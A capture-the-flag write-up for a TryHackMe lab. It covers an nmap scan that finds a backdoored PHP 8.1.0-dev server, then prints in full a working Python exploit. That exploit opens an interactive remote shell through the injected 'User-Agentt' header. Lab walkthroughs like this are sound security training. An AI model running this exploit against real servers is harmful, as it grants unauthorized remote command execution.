# Agent_T
![tryhackme_logo](https://user-images.githubusercontent.com/83867734/185771149-cb02c6f2-8476-4ab3-a626-cca8db0a08bf.png)

Difficulty: **Easy**

Agent T uncovered this website, which looks innocent enough, but something seems off about how the server responds...

Tags
--
* PHP 8.1.0-dev
* User-Agent
* RCE

Tools used
--
* nmap

Machines
--
Attacker:
* Name: attacker_machine
* Operating System: Athena OS
* IP Address: 10.8.16.123

Victim:
* Name: victim_machine
* IP Address: 10.10.180.39
* Other information must be gathered during the attack

Phase 1: Enumeration
--
```
sudo nmap -sS -sC -sV 10.10.180.39 -p- -T5 -vvv

<SNIP>
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 62 PHP cli server 5.5 or later (PHP 8.1.0-dev)
<SNIP>
```
By searching on Internet for `PHP 8.1.0-dev` vulnerability, we can found the following script:
```python
#!/usr/bin/env python3
import os
import re
import requests

host = input("Enter the full host url:\n")
request = requests.Session()
response = request.get(host)

if str(response) == '<Response [200]>':
    print("\nInteractive shell is opened on", host, "\nCan't acces tty; job crontol turned off.")
    try:
        while 1:
            cmd = input("$ ")
            headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
            "User-Agentt": "zerodiumsystem('" + cmd + "');"
            }
            response = request.get(host, headers = headers, allow_redirects = False)
            current_page = response.text
            stdout = current_page.split('<!DOCTYPE html>',1)
            text = print(stdout[0])
    except KeyboardInterrupt:
        print("Exiting...")
        exit

else:
    print("\r")
    print(response)
    print("Host is not available, aborting...")
    exit
```
Source: https://www.exploit-db.com/exploits/49933

By running it and giving `http://10.10.180.39`as input, we get the shell and get the flag by `cat /flag.txt`.
